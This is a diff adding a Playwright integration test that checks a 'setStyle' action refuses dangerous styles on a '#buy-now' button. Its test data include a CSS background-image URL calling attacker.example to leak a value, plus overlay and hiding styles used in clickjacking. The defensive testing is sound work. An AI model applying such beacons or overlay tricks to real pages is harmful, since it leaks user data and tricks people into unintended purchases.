@@ -197,6 +197,16 @@ test.describe('Milestone 2 Integration', () => {
     expect(res.results[1]).toMatchObject({ ok: false, held: true });
     expect(await page.evaluate(() => window.__bought === true)).toBe(false);
 
+    // setStyle は見た目を直す範囲だけ。外部参照(読んだ値の持ち出し口)と、要素を重ねる/隠すプロパティは断る。
+    const styles = await run([
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { backgroundImage: 'url(https://attacker.example/?d=1)' } } },
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { position: 'fixed', zIndex: '9999' } } },
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { opacity: '0' } } },
+      { verb: 'setStyle', args: { selector: '#buy-now', styles: { marginTop: '-40px' } } },
+    ]);
+    expect(styles.results.map((r) => r.ok)).toEqual([false, false, false, false]);
+    expect(await page.$eval('#buy-now', (el) => [el.style.backgroundImage, el.style.position, el.style.opacity, el.style.marginTop])).toEqual(['', '', '', '']);
+
     await page.close();
   });
 
